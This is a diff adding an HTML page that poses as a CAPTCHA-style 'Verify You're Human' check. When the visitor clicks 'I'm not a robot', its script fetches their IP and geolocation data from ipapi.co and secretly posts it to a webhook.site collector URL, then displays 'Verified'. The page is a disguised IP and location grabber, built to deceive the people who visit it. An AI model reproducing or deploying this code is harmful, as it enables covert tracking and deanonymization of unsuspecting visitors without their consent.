@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Verification Required</title>
+  <style>
+    body {
+      background: #f5f5f5;
+      font-family: "Segoe UI", sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    button {
+      background: #4CAF50;
+      color: white;
+      padding: 12px 24px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: #45a049;
+    }
+
+    .checkmark {
+      font-size: 32px;
+      color: green;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Verify You’re Human</h2>
+    <button onclick="getIP()">I’m not a robot</button>
+    <div class="checkmark" id="check">✔ Verified</div>
+  </div>
+
+  <script>
+    async function getIP() {
+      const btn = document.querySelector('button');
+      btn.disabled = true;
+      btn.innerText = 'Verifying...';
+
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+
+        // Tumhara Webhook URL
+        await fetch("https://webhook.site/b545b9b2-1dc7-473f-a089-bdc0ceb0", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
+
+        document.getElementById("check").style.display = "block";
+        btn.innerText = "Verified";
+      } catch (e) {
+        btn.innerText = "Try Again";
+        btn.disabled = false;
+      }
+    }
+  </script>
+</body>
+</html>
